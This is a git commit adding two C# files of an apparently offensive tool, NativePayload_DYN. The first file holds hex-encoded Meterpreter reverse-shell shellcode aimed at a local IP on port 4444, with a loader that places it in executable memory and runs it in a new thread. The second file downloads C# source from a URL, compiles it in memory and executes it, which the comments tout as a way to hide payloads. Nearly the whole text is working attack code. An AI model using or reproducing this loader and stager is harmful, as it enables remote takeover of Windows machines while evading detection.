d22a80962d0afb9378cb378a6a66162a18152698
Damon Mohammadbagher <DamonMohammadbagher@users.noreply.github.com>
2023-03-21 06:42:58 -0400

    Add files via upload

---
+++ NativePayload_DYN/Class1.cs
@@ -0,0 +1,25 @@
+﻿
+        string X = "fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,51,56,48,31,d2,65,48,8b,52,60,48,8b,52,18,48,8b,52,20,48,8b,72,50,48,0f,b7,4a,4a,4d,31,c9,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,50,8b,48,18,44,8b,40,20,49,01,d0,e3,56,48,ff,c9,41,8b,34,88,48,01,d6,4d,31,c9,48,31,c0,ac,41,c1,c9,0d,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,11,5c,c0,a8,38,01,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,05,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5";
+        string[] XX = X.Split(',');
+        byte[] result_de_obf_payload = new byte[XX.Length];
+            for (int i = 0; i<XX.Length; i++)
+            {
+                result_de_obf_payload[i] = Convert.ToByte(XX[i], 16);
+            }
+    UInt32 MEM_COMMIT = 0x1000;
+    UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+    Console.WriteLine();
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.WriteLine("Bingo Meterpreter session by Dynamic / Integration Codes ;)");
+
+            UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)result_de_obf_payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(result_de_obf_payload, 0x00000000, (IntPtr)(funcAddr), result_de_obf_payload.Length);
+
+            IntPtr hThread = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr pinfo = IntPtr.Zero;
+
+    hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
+            WaitForSingleObject(hThread, 0xffffffff);
+    Console.ForegroundColor = ConsoleColor.Gray;
---
+++ NativePayload_DYN/NativePayload_DYN.cs
@@ -0,0 +1,149 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.CodeDom.Compiler;
+using Microsoft.CSharp;
+
+namespace NativePayload_DYN
+{
+    class Program
+    {
+        private static string[] Loading_Dlls;
+        private static string[] Loading_Namespaces;
+
+        private static List<string> ReferencedAssemblies { get; set; }
+        private static List<string> UsingNamespaces { get; set; }
+
+        private static string DynamicCode;
+
+        static void Main(string[] args)
+        {
+            Loading_Dlls = new string[] { "System.dll", "System.Core.dll", "System.Data.dll", "System.Xml.dll", "System.Xml.Linq.dll" , "System.Runtime.InteropServices.dll", "mscorlib.dll" };
+            Loading_Namespaces = new string[] { "System", "System.Collections.Generic", "System.Linq", "System.Text" , "System.Runtime.InteropServices" };
+
+            ReferencedAssemblies = new List<string>();
+            UsingNamespaces = new List<string>();
+
+           
+            //sourceCode = System.IO.File.ReadAllText("class1.cs");
+            if (args[0].ToUpper() == "-F")
+            {
+                DynamicCode = System.IO.File.ReadAllText(args[1]);
+            }
+
+            if (args[0].ToUpper() == "-W")
+            {
+                System.Net.WebClient web = new System.Net.WebClient();
+                string xCxSharp_Payload = web.DownloadString(args[1]);
+                DynamicCode = xCxSharp_Payload;
+            }
+            
+
+            Console.ForegroundColor = ConsoleColor.DarkGray;
+            Console.WriteLine();
+            Console.WriteLine("NativePayload_DYN tool , Runtime/Compiler Dynamic Managed Code ");
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.WriteLine("Published by Damon Mohammadbagher Jun 2017");
+            Console.WriteLine();
+            Console.ForegroundColor = ConsoleColor.DarkGreen;
+            Console.WriteLine("[!] Downloading .NET Source Code File by File/Url {0}", args[1]);
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("[>] Runtime Compiling .NET Source Code File and Generate/Execute In Memory");
+
+            Console.ForegroundColor = ConsoleColor.Gray;
+
+            CompilerErrorCollection compilationErrors = new CompilerErrorCollection();
+
+            bool compilationSucceeded = true;
+            
+            CSharpCodeProvider provider = new CSharpCodeProvider();
+
+            /// Build the parameters
+            CompilerParameters Code_Params = new CompilerParameters();
+
+            Code_Params.TreatWarningsAsErrors = false;
+
+            /// Add references.
+            Code_Params.ReferencedAssemblies.AddRange(Loading_Dlls);
+            Code_Params.ReferencedAssemblies.AddRange(ReferencedAssemblies.ToArray());
+            
+            /// Generating output in Memory , oh yeah ;) Important point.
+            Code_Params.GenerateInMemory = true;
+
+            /// Add using statements.
+            StringBuilder script = new StringBuilder();
+            foreach (var usingNamespace in Loading_Namespaces)
+                script.AppendFormat("using {0};\n", usingNamespace);
+
+            foreach (var additionalUsingNamespace in UsingNamespaces)
+                script.AppendFormat("using {0};\n", additionalUsingNamespace);
+
+            /// Generating Dynamic Code by StringBuilder , 
+            /// "DynamicCode" Variable is your Dynamic Code and this RAW C#.NET Code injected by HTTP Traffic in this case.
+            /// you can Download or Inject this RAW C# Code by other Protocols or with Obfuscation method etc.
+            script.AppendLine();
+            script.AppendLine("namespace Execute_Me_in_Memory");
+            script.AppendLine("{");
+            script.AppendLine("    public class Program");
+            script.AppendLine("    {");
+            script.AppendLine("        public void main(string your_input_args)");
+            script.AppendLine("        {");
+            script.AppendLine("            ");
+            script.AppendLine("            ");
+            script.AppendFormat("              {0}\n", DynamicCode);
+            script.AppendLine("            ");
+            script.AppendLine("            ");
+            script.AppendLine("        }");
+            script.AppendLine("   [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);     ");
+            script.AppendLine("   [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);     ");
+            script.AppendLine("   [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);     ");
+            script.AppendLine("    }");
+            script.AppendLine("}");
+
+            /// Compiling / Executing this C#.NET Code in Memory 
+            /// Begin
+            
+            CompilerResults Compiler_Results = provider.CompileAssemblyFromSource(Code_Params, script.ToString());
+
+            if (Compiler_Results.Errors.Count > 0)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[Compile error]");
+
+                foreach (CompilerError Compiler_Error in Compiler_Results.Errors)
+                {                  
+                    compilationErrors.Add(Compiler_Error);
+
+                    Console.WriteLine("[error] : {0}",Compiler_Error.ErrorText);
+
+                    if (!Compiler_Error.IsWarning)
+                    {
+                        compilationSucceeded = false;
+                    }
+                }
+
+                Console.ForegroundColor = ConsoleColor.Gray;
+            }
+
+            if (compilationSucceeded)
+            {
+                var Compiled_Assembly = Compiler_Results.CompiledAssembly;
+                var Exe = Compiled_Assembly.CreateInstance("Execute_Me_in_Memory.Program");
+
+                var type = Exe.GetType();
+                var methodInfo = type.GetMethod("main");
+
+                /// Execute in memory.
+                /// "your input" is important thing , you can modify your code by this variable too
+                methodInfo.Invoke(Exe, new object[] { "your input" });
+            }
+
+            /// Compiling / Executing this C#.NET Code in Memory 
+            /// End
+
+          
+
+        }
+    }
+}
